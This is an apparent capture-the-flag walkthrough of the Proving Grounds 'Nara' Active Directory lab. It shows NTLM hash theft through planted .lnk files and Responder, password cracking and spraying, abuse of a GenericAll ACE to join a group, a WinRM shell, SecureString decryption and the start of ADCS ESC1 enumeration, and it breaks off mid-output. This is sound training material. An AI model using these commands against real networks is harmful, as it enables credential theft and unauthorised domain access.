# **Nara | PG Practice**

## **Difficulty : Very Hard**

***

Running an nmap scan we have :


```bash
# Nmap 7.94SVN scan initiated Wed Aug 14 21:11:54 2024 as: nmap -p- -T4 -v --min-rate=1000 -sCV -oN nmap.txt -Pn 192.168.209.30
Increasing send delay for 192.168.209.30 from 0 to 5 due to 11 out of 21 dropped probes since last increase.
Increasing send delay for 192.168.209.30 from 5 to 10 due to 11 out of 26 dropped probes since last increase.
Nmap scan report for 192.168.209.30
Host is up (0.17s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-08-14 20:16:35Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: nara-security.com0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=Nara.nara-security.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:Nara.nara-security.com
| Issuer: commonName=NARA-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-02T01:56:04
| Not valid after:  2025-08-02T01:56:04
| MD5:   fbf8:e851:dddb:efe3:c9f0:4605:1d4c:8878
|_SHA-1: bfc8:975f:6219:267f:4112:bff5:d130:6cb4:e0d1:6fea
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap          Microsoft Windows Active Directory LDAP (Domain: nara-security.com0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=Nara.nara-security.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:Nara.nara-security.com
| Issuer: commonName=NARA-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-02T01:56:04
| Not valid after:  2025-08-02T01:56:04
| MD5:   fbf8:e851:dddb:efe3:c9f0:4605:1d4c:8878
|_SHA-1: bfc8:975f:6219:267f:4112:bff5:d130:6cb4:e0d1:6fea
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: nara-security.com0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=Nara.nara-security.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:Nara.nara-security.com
| Issuer: commonName=NARA-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-02T01:56:04
| Not valid after:  2025-08-02T01:56:04
| MD5:   fbf8:e851:dddb:efe3:c9f0:4605:1d4c:8878
|_SHA-1: bfc8:975f:6219:267f:4112:bff5:d130:6cb4:e0d1:6fea
3269/tcp  open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=Nara.nara-security.com
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:Nara.nara-security.com
| Issuer: commonName=NARA-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-02T01:56:04
| Not valid after:  2025-08-02T01:56:04
| MD5:   fbf8:e851:dddb:efe3:c9f0:4605:1d4c:8878
|_SHA-1: bfc8:975f:6219:267f:4112:bff5:d130:6cb4:e0d1:6fea
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=Nara.nara-security.com
| Issuer: commonName=Nara.nara-security.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-06T12:45:53
| Not valid after:  2024-11-05T12:45:53
| MD5:   3653:d557:37ce:b6cc:64c8:ef5b:f664:bfaa
|_SHA-1: 4641:1138:a700:92f6:64fd:8c8c:83b5:65e4:2f26:a24d
|_ssl-date: 2024-08-14T20:18:59+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: NARASEC
|   NetBIOS_Domain_Name: NARASEC
|   NetBIOS_Computer_Name: NARA
|   DNS_Domain_Name: nara-security.com
|   DNS_Computer_Name: Nara.nara-security.com
|   DNS_Tree_Name: nara-security.com
|   Product_Version: 10.0.20348
|_  System_Time: 2024-08-14T20:17:45+00:00
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Supported Methods: GET
9389/tcp  open  mc-nmf            .NET Message Framing
49664/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  msrpc             Microsoft Windows RPC
49669/tcp open  unknown
49685/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49687/tcp open  unknown
49696/tcp open  unknown
49698/tcp open  unknown
49715/tcp open  unknown
49725/tcp open  unknown
Service Info: Host: NARA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-08-14T20:17:43
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 14 21:19:20 2024 -- 1 IP address (1 host up) scanned in 446.05 seconds
```


> We can see that this is an active directory machine with domain name as ; "`nara-security.com`" with DC/Hostname as ; `"NARA"`, It will be best adding this to your `/etc/hosts` file for domain resolution.


- We can confirm this using `netexec` utility


```bash
❯ nxc smb 192.168.209.30

SMB         192.168.209.30  445    NARA             [*] Windows Server 2022 Build 20348 x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:False)
```



- SMB Enumeration ; There are literally no shares that a NULL user has access to except from the `nara` share

```bash
❯ smbclient -L \\\\192.168.209.30\\
Password for [WORKGROUP\sec-fortress]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nara            Disk      company share
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
tstream_smbXcli_np_destructor: cli_close failed on pipe srvsvc. Error was NT_STATUS_IO_TIMEOUT
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.209.30 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

==========================================================================

## In-accessible Shares

❯ smbclient \\\\192.168.209.30\\C$\\
Password for [WORKGROUP\sec-fortress]:
tree connect failed: NT_STATUS_ACCESS_DENIED

❯ smbclient \\\\192.168.209.30\\ADMIN$\\
Password for [WORKGROUP\sec-fortress]:
tree connect failed: NT_STATUS_ACCESS_DENIED

❯ smbclient \\\\192.168.209.30\\IPC$\\
Password for [WORKGROUP\sec-fortress]:
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_NO_SUCH_FILE listing \*
smb: \> put nmap.txt
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \nmap.txt
smb: \> exit

❯ smbclient \\\\192.168.209.30\\NETLOGON\\
Password for [WORKGROUP\sec-fortress]:
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_ACCESS_DENIED listing \*
smb: \> exit

❯ smbclient \\\\192.168.209.30\\SYSVOL\\
Password for [WORKGROUP\sec-fortress]:
Try "help" to get a list of possible commands.
smb: \> dir
NT_STATUS_ACCESS_DENIED listing \*
smb: \> exit

## Accessible Shares

❯ smbclient \\\\192.168.209.30\\nara\\
Password for [WORKGROUP\sec-fortress]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jul 30 15:31:58 2023
  ..                                DHS        0  Wed Aug 14 20:53:15 2024
  Documents                           D        0  Sun Jul 30 15:03:13 2023
  Important.txt                       A     2200  Sun Jul 30 15:05:31 2023
  IT                                  D        0  Wed Aug 14 21:14:43 2024

                7699711 blocks of size 4096. 3661536 blocks available
smb: \>
```


- So i downloaded the `Important.txt` file in this share using the `mget` command and the content can be viewed as shown below


```bash
❯ \cat Important.txt
Dear Team,

We hope this message finds you well. We wanted to remind all employees to take a moment each day to check the shared documents folder diligently. As part of our commitment to streamline processes and enhance efficiency, important documents are frequently uploaded to this folder for your attention and action.

The shared documents folder serves as a central hub for crucial updates, contracts, agreements, and various other essential materials requiring your attention. To ensure that you don't miss any critical information, please make it a habit to access the folder at the beginning of your workday or as often as possible.

Here are a few simple steps to stay up-to-date and ensure timely actions:

* Access the Shared Documents Folder: Log in to your company account and navigate to the designated shared documents folder. If you encounter any issues accessing the folder, please reach out to the IT department for assistance.

* Review New Additions: Look for any new documents that might have been uploaded since your last visit. These documents might require your signature, feedback, or acknowledgment.

* Take Action Promptly: If there are documents that need your attention, please act promptly and follow the necessary procedures as indicated within each document. Whether it's a signature, a comment, or any other form of response, timely actions are vital to keep our operations running smoothly.

* Seek Clarification: If you encounter any uncertainty or have questions about the documents you find, don't hesitate to reach out to the relevant department or the person mentioned in the document for clarification. It's essential that you fully understand what's required before proceeding.

Remember, staying informed and acting promptly ensures that projects progress seamlessly, contracts get executed on time, and the company as a whole operates efficiently. Your cooperation in this matter is greatly appreciated and contributes to our collective success.

Thank you for your attention to this matter, and if you have any concerns or suggestions to improve our document management process, please share them with your department head or the HR team.
```

> This text literally gave me the hint that we can actually place files in the `nara` share, You know what i am thinking ??..........NTLM Theft 😈.

- First of all i tried to enumerate users using the RID brute technique since we have `READ` access on the “Remote `IPC`” share.

```bash
❯ cme smb 192.168.209.30 -u guest -p "" --rid-brute | grep -i sidtypeuser | awk -F'\' '{print $2}' | cut -d '(' -f1 >> users.txt

❯ \cat users.txt
Administrator 
Guest 
krbtgt 
NARA$ 
Amelia.O'Brien 
Damian.Johnson 
Helen.Robinson 
Sara.O'Sullivan 
Jasmine.Roberts 
Declan.Reynolds 
Jodie.Summers 
Carolyn.Hill 
Jemma.Humphries 
Tracy.White
```

- Then as usual tried to try usernames as password, I mean leaving no stone un-turned, This is Offsec 😭🤲.

```bash
❯ cme smb 192.168.209.30 -u users.txt -p users.txt --no-bruteforce --continue-on-success

SMB         192.168.209.30  445    NARA             [*] Windows 10.0 Build 20348 x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:False)
SMB         192.168.209.30  445    NARA             [-] nara-security.com\Administrator:Administrator STATUS_LOGON_FAILURE 
SMB         192.168.209.30  445    NARA             [-] nara-security.com\Guest:Guest STATUS_LOGON_FAILURE 
SMB         192.168.209.30  445    NARA             [-] nara-security.com\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         192.168.209.30  445    NARA             [-] nara-security.com\NARA$:NARA$ STATUS_LOGON_FAILURE 
SMB         192.168.209.30  445    NARA             [-] nara-security.com\Amelia.O'Brien:Amelia.O'Brien STATUS_LOGON_FAILURE 
SMB         192.168.209.30  445    NARA             [-] nara-security.com\Damian.Johnson:Damian.Johnson STATUS_LOGON_FAILURE 
SMB         192.168.209.30  445    NARA             [-] nara-security.com\Helen.Robinson:Helen.Robinson STATUS_LOGON_FAILURE 
SMB         192.168.209.30  445    NARA             [-] nara-security.com\Sara.O'Sullivan:Sara.O'Sullivan STATUS_LOGON_FAILURE 
SMB         192.168.209.30  445    NARA             [-] nara-security.com\Jasmine.Roberts:Jasmine.Roberts STATUS_LOGON_FAILURE 
SMB         192.168.209.30  445    NARA             [-] nara-security.com\Declan.Reynolds:Declan.Reynolds STATUS_LOGON_FAILURE 
SMB         192.168.209.30  445    NARA             [-] nara-security.com\Jodie.Summers:Jodie.Summers STATUS_LOGON_FAILURE 
SMB         192.168.209.30  445    NARA             [-] nara-security.com\Carolyn.Hill:Carolyn.Hill STATUS_LOGON_FAILURE 
SMB         192.168.209.30  445    NARA             [-] nara-security.com\Jemma.Humphries:Jemma.Humphries STATUS_LOGON_FAILURE 
SMB         192.168.209.30  445    NARA             [-] nara-security.com\Tracy.White:Tracy.White STATUS_LOGON_FAILURE
```

- That didn't turn out as expected so the next thing on my list is the ASREPRoasting attack which should be possible to get any user hash due to Kerberos pre-authentication required attribute enabled on an object.

```bash
❯ impacket-GetNPUsers nara-security.com/ -dc-ip 192.168.209.30 -usersfile users.txt -format hashcat -outputfile hashes.txt

Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User NARA$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Amelia.O'Brien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Damian.Johnson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Helen.Robinson doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Sara.O'Sullivan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jasmine.Roberts doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Declan.Reynolds doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jodie.Summers doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Carolyn.Hill doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Jemma.Humphries doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Tracy.White doesn't have UF_DONT_REQUIRE_PREAUTH set
```

- The last technique also didn't yield result as expected so i decided to run my kerbrute and enumerate users again just to be sure i am on the right path. But hehe, No users where discovered except from the `Administrator` and `Guest` user account which is as usual. 

```bash
❯ kerbrute userenum --dc 192.168.209.30 --domain nara-security.com /usr/share/wordlists/seclist/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.1 (385cb2b) - 08/14/24 - Ronnie Flathers @ropnop

2024/08/14 21:35:26 >  Using KDC(s):
2024/08/14 21:35:26 >   192.168.209.30:88

2024/08/14 21:38:50 >  [+] VALID USERNAME:       guest@nara-security.com
2024/08/14 21:55:53 >  [+] VALID USERNAME:       administrator@nara-security.com

2024/08/14 23:13:00 >  Done! Tested 8295455 usernames (2 valid) in 5854.516 seconds

```

- Moving on to the NTLM Theft technique i decided to use the [`ntlm_theft`](https://github.com/Greenwolf/ntlm_theft.git) tool from ***Green Wolf*** to exploit this by generating a malicious `.LNK` file that will get executed by the automated user in that share and then return their hashes. ( That is if there is any, but let try :] )

```bash
❯ python3 ntlm_theft.py -g all -s 192.168.45.235 -f test

Created: test/test.scf (BROWSE TO FOLDER)
Created: test/test-(url).url (BROWSE TO FOLDER)
Created: test/test-(icon).url (BROWSE TO FOLDER)
Created: test/test.lnk (BROWSE TO FOLDER)
Created: test/test.rtf (OPEN)
Created: test/test-(stylesheet).xml (OPEN)
Created: test/test-(fulldocx).xml (OPEN)       
Created: test/test.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: test/test-(includepicture).docx (OPEN)
Created: test/test-(remotetemplate).docx (OPEN)
Created: test/test-(frameset).docx (OPEN)
Created: test/test-(externalcell).xlsx (OPEN)
Created: test/test.wax (OPEN)
Created: test/test.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: test/test.asx (OPEN)
Created: test/test.jnlp (OPEN)
Created: test/test.application (DOWNLOAD AND OPEN)
Created: test/test.pdf (OPEN AND ALLOW)
Created: test/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: test/Autorun.inf (BROWSE TO FOLDER)
Created: test/desktop.ini (BROWSE TO FOLDER)
Generation Complete.
```

- After generating i uploaded the `test.lnk` file to each directory in the share cos i don't know where the automation is taking place ☹️. 

```
❯ smbclient \\\\192.168.165.30\\nara\\
Password for [WORKGROUP\sec-fortress]:
Try "help" to get a list of possible commands.
smb: \> put test.lnk
putting file test.lnk as \test.lnk (0.7 kb/s) (average 0.7 kb/s)
smb: \> cd IT
smb: \IT\> put test.lnk
putting file test.lnk as \IT\test.lnk (1.5 kb/s) (average 0.9 kb/s)
smb: \IT\> cd ..\
smb: \> cd Documents\
smb: \Documents\> put test.lnk
putting file test.lnk as \Documents\test.lnk (4.3 kb/s) (average 1.3 kb/s)
smb: \Documents\> 
```

- Then started up `responder` and hell yeah i got user `Tracy.White` hash which we discovered earlier.

```bash
❯ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]

--SNIP--

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 192.168.165.30
[SMB] NTLMv2-SSP Username : NARASEC\Tracy.White
[SMB] NTLMv2-SSP Hash     : Tracy.White::NARASEC:9bbf8934331a4560:7E3E7EB81FF46C2022052D262FF86FED:0101000000000000804E1194E3EEDA012C0D0C83CBDD665900000000020008004F0031003400450001001E00570
049004E002D004300420041003200580050004B00420052005500300004003400570049004E002D004300420041003200580050004B0042005200550030002E004F003100340045002E004C004F00430041004C00030014004F00310034004
5002E004C004F00430041004C00050014004F003100340045002E004C004F00430041004C0007000800804E1194E3EEDA0106000400020000000800300030000000000000000100000000200000452F70F2B66A34630BD52340E899C3B9A07
2F2D5A53D205FCBB235EA806B7FB60A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200330035000000000000000000
[*] Skipping previously captured hash for NARASEC\Tracy.White
[*] Skipping previously captured hash for NARASEC\Tracy.White
[*] Skipping previously captured hash for NARASEC\Tracy.White
[*] Skipping previously captured hash for NARASEC\Tracy.White
[*] Skipping previously captured hash for NARASEC\Tracy.White
[+] Exiting...
[*] Skipping previously captured hash for NARASEC\Tracy.White
```


> You can also use the [`Hashgrab`](https://github.com/xct/hashgrab) tool by ***`XCT`*** to generate the `.LNK` file, haven't tried it before but it is worth the try at least.

- EZPZ, Cracked this user hash and got the password with `JtR`

```bash
❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
zqwj041FGX       (Tracy.White)     
1g 0:00:00:01 DONE (2024-08-15 07:25) 0.7874g/s 1954Kp/s 1954Kc/s 1954KC/s zta729..zozorox92
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

- The goal is to always password spray, I mean on a CTF not real world engagement 🤣🥹, and see if there are any other users using that same password. Unfortunately, Only the user `Tracy.White` which we have acquired uses that credential.

```bash
❯ cme smb 192.168.165.30 -u users.txt -p "zqwj041FGX" --continue-on-success
SMB         192.168.165.30  445    NARA             [*] Windows 10.0 Build 20348 x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:False)
SMB         192.168.165.30  445    NARA             [-] nara-security.com\Administrator:zqwj041FGX STATUS_LOGON_FAILURE 
SMB         192.168.165.30  445    NARA             [-] nara-security.com\Guest:zqwj041FGX STATUS_LOGON_FAILURE 
SMB         192.168.165.30  445    NARA             [-] nara-security.com\krbtgt:zqwj041FGX STATUS_LOGON_FAILURE 
SMB         192.168.165.30  445    NARA             [-] nara-security.com\NARA$:zqwj041FGX STATUS_LOGON_FAILURE 
SMB         192.168.165.30  445    NARA             [-] nara-security.com\Amelia.O'Brien:zqwj041FGX STATUS_LOGON_FAILURE 
SMB         192.168.165.30  445    NARA             [-] nara-security.com\Damian.Johnson:zqwj041FGX STATUS_LOGON_FAILURE 
SMB         192.168.165.30  445    NARA             [-] nara-security.com\Helen.Robinson:zqwj041FGX STATUS_LOGON_FAILURE 
SMB         192.168.165.30  445    NARA             [-] nara-security.com\Sara.O'Sullivan:zqwj041FGX STATUS_LOGON_FAILURE 
SMB         192.168.165.30  445    NARA             [-] nara-security.com\Jasmine.Roberts:zqwj041FGX STATUS_LOGON_FAILURE 
SMB         192.168.165.30  445    NARA             [-] nara-security.com\Declan.Reynolds:zqwj041FGX STATUS_LOGON_FAILURE 
SMB         192.168.165.30  445    NARA             [-] nara-security.com\Jodie.Summers:zqwj041FGX STATUS_LOGON_FAILURE 
SMB         192.168.165.30  445    NARA             [-] nara-security.com\Carolyn.Hill:zqwj041FGX STATUS_LOGON_FAILURE 
SMB         192.168.165.30  445    NARA             [-] nara-security.com\Jemma.Humphries:zqwj041FGX STATUS_LOGON_FAILURE 
SMB         192.168.165.30  445    NARA             [+] nara-security.com\Tracy.White:zqwj041FGX
```

- The rule of thumb for me is always to load up bloodhound once i have valid credentials. So i use the `bloodhound-python` tool which uses LDAP to query domain information if you have valid set of credentials. You don't have to wait till you get foothold so you can run a SharpHound collector, Hell NO!!!!!!.

```bash
❯ bloodhound-python -u 'Tracy.White' -p 'zqwj041FGX' -ns 192.168.165.30 -d nara-security.com -c all --zip --dns-timeout 50
INFO: Found AD domain: nara-security.com
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (nara.nara-security.com:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: nara.nara-security.com
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: nara.nara-security.com
INFO: Found 14 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: Nara.nara-security.com
INFO: Done in 02M 48S
INFO: Compressing output into 20240815073121_bloodhound.zip
```

- Then uploaded the loot to bloodhound GUI and has shown below our user `Tracy.White` has `GenericAll` ACE to the **"Remote Access"** group. At least we would now be able to connect via `WinRM` or `RDP`  by adding our self to this groups respectively.


![](https://i.imgur.com/65sZKQh.png)


- We can carry out this operation by doing so, using the `net` tool on kali to add our self to the group and checking if this operation was successful.


```bash
# Add to group
❯ net rpc group addmem "REMOTE ACCESS" "Tracy.White" -U "nara-security.com"/"Tracy.White"%"zqwj041FGX" -S 192.168.165.30

# Confirm operation was successful
❯ net rpc group members "REMOTE ACCESS" -U "nara-security.com"/"Tracy.White"%"zqwj041FGX" -S 192.168.165.30

NARASEC\Jodie.Summers
NARASEC\Tracy.White
```

- We can then try to authenticate via `WinRM` using CrackMapExec and see if we truly have access <#. Yes we do!

```bash
❯ cme winrm 192.168.165.30 -u Tracy.White -p zqwj041FGX
SMB         192.168.165.30  5985   NARA             [*] Windows 10.0 Build 20348 (name:NARA) (domain:nara-security.com)
HTTP        192.168.165.30  5985   NARA             [*] http://192.168.165.30:5985/wsman
HTTP        192.168.165.30  5985   NARA             [+] nara-security.com\Tracy.White:zqwj041FGX (Pwn3d!)
```

- So go ahead and login using the `evil-winrm` utility as user `Tracy.White` which should be successful.

```bash
❯ evil-winrm -i 192.168.165.30 -u Tracy.White -p zqwj041FGX
                                        
Evil-WinRM shell v3.5
                                        
--SNIP--
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tracy.white\Documents> whoami
narasec\tracy.white
```


- Now we have to load Post-Exploitation tools like `WinPEAS`, `Snaffler`, `LaZagne`, `MimiKatz` etc to see what we have. However majority of this tools where blocked by AV so i started manual enumeration and found this `automation.txt` file.

```bash
*Evil-WinRM* PS C:\Users\tracy.white\Documents> dir


    Directory: C:\Users\tracy.white\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         7/30/2023   8:05 AM            373 automation.txt
```


- The content looked like a powershell secure string which is used to help protect confidential text.

```bash
*Evil-WinRM* PS C:\Users\tracy.white\Documents> type automation.txt
Enrollment Automation Account

01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b
```

- To decrypt this we can replicate the following steps

```bash
*Evil-WinRM* PS C:\Users\tracy.white\Documents> $user = "Enrollment Automation Account" # Not necessary a valid user if you don't have one

*Evil-WinRM* PS C:\Users\tracy.white\Documents> $pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b" | ConvertTo-SecureString

*Evil-WinRM* PS C:\Users\tracy.white\Documents> $cred = New-Object System.Management.Automation.PSCredential($user, $pass)

*Evil-WinRM* PS C:\Users\tracy.white\Documents> $cred.GetNetworkCredential() | fl


UserName       : Enrollment Automation Account
Password       : hHO_S9gff7ehXw
SecurePassword : System.Security.SecureString
Domain         :

```

- Now that we have the clear text password but don't know which account uses this password, we can go ahead and password spray and as shown below we got a hit on user `Jodie.Summers`

```bash
❯ cme smb 192.168.220.30 -u users.txt -p hHO_S9gff7ehXw
SMB         192.168.220.30  445    NARA             [*] Windows 10.0 Build 20348 x64 (name:NARA) (domain:nara-security.com) (signing:True) (SMBv1:False)
SMB         192.168.220.30  445    NARA             [-] nara-security.com\Administrator:hHO_S9gff7ehXw STATUS_LOGON_FAILURE 
SMB         192.168.220.30  445    NARA             [-] nara-security.com\Guest:hHO_S9gff7ehXw STATUS_LOGON_FAILURE 
SMB         192.168.220.30  445    NARA             [-] nara-security.com\krbtgt:hHO_S9gff7ehXw STATUS_LOGON_FAILURE 
SMB         192.168.220.30  445    NARA             [-] nara-security.com\NARA$:hHO_S9gff7ehXw STATUS_LOGON_FAILURE 
SMB         192.168.220.30  445    NARA             [-] nara-security.com\Amelia.O'Brien:hHO_S9gff7ehXw STATUS_LOGON_FAILURE 
SMB         192.168.220.30  445    NARA             [-] nara-security.com\Damian.Johnson:hHO_S9gff7ehXw STATUS_LOGON_FAILURE 
SMB         192.168.220.30  445    NARA             [-] nara-security.com\Helen.Robinson:hHO_S9gff7ehXw STATUS_LOGON_FAILURE 
SMB         192.168.220.30  445    NARA             [-] nara-security.com\Sara.O'Sullivan:hHO_S9gff7ehXw STATUS_LOGON_FAILURE 
SMB         192.168.220.30  445    NARA             [-] nara-security.com\Jasmine.Roberts:hHO_S9gff7ehXw STATUS_LOGON_FAILURE 
SMB         192.168.220.30  445    NARA             [-] nara-security.com\Declan.Reynolds:hHO_S9gff7ehXw STATUS_LOGON_FAILURE 
SMB         192.168.220.30  445    NARA             [+] nara-security.com\Jodie.Summers:hHO_S9gff7ehXw 
```

- I don't know what made me think about ADCS attacks but the **"Enrollment Automation Account"** already gave it away i think. so i decided to enumerate vulnerable certificates using the `certipy` tool. 

```bash
❯ certipy find -vulnerable -dc-ip 192.168.220.30 -u 'Jodie.Summers@nara-security.com' -p 'hHO_S9gff7ehXw'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'NARA-CA' via CSRA
[!] Got error while trying to get CA configuration for 'NARA-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'NARA-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'NARA-CA'
[*] Saved BloodHound data to '20240816092801_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20240816092801_Certipy.txt'
[*] Saved JSON output to '20240816092801_Certipy.json'
```


- Also this user belongs to the `CERTIFICATE SERVICE DCOM ACCESS` group while mapping things out with bloodhound.


![](https://i.imgur.com/IAwcFIN.png)



- As shown below this is vulnerable to `ESC1` exploit, using few blogs i was able to navigate this ; [Blog1](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#abuse), [`Blog2`](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/)

```json
❯ \cat 20240816092801_Certipy.txt
Certificate Authorities
  0
    CA Name                             : NARA-CA
    DNS Name                            : Nara.nara-security.com
    Certificate Subject                 : CN=NARA-CA, DC=nara-security, DC=com
    Certificate Serial Number           : 2401E520F70B7DA34C32FABC71D89E1D
    Certificate Validity Start          : 2023-07-30 14:06:05+00:00
    Certificate Validity End            : 2123-07-30 14:16:04+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : NARA-SECURITY.COM\Administrators
      Access Rights
        ManageCertificates              : NARA-SECURITY.COM\Administrators
                                          NARA-SECURITY.COM\Domain Admins
                                          NARA-SECURITY.COM\Enterprise Admins
        ManageCa                        : NARA-SECURITY.COM\Administrators
                                          NARA-SECURITY.COM\Domain Admins
                                          NARA-SECURITY.COM\Enterprise Admins
